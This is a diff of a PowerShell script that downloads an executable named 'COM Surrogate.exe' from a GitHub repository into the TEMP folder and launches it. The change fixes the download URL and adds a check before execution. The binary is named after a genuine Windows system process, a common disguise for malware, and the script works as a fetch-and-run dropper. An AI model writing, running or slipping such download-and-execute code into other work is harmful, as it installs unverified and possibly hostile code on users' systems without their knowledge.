@@ -1,11 +1,16 @@
-# Define the URL of the .exe file
-$url = "https://github.com/M7mmdddd/webstie-demo/blob/main/files/COM%20Surrogate.exe"
+# Define the URL of the file to download
+$url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/COM%20Surrogate.exe"
 
-# Define the path where the .exe will be saved (e.g., in the Temp folder)
-$outputPath = "$env:TEMP\COM Surrogate.ex"
+# Define the local path where the file will be saved
+$output = "$env:TEMP\COM_Surrogate.exe"
 
-# Download the .exe file
-Invoke-WebRequest -Uri $url -OutFile $outputPath
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $output
 
-# Execute the .exe file
-Start-Process -FilePath $outputPath
+# Check if the file was downloaded successfully
+if (Test-Path $output) {
+    # Execute the downloaded file
+    Start-Process -FilePath $output
+} else {
+    Write-Host "Failed to download the file."
+}
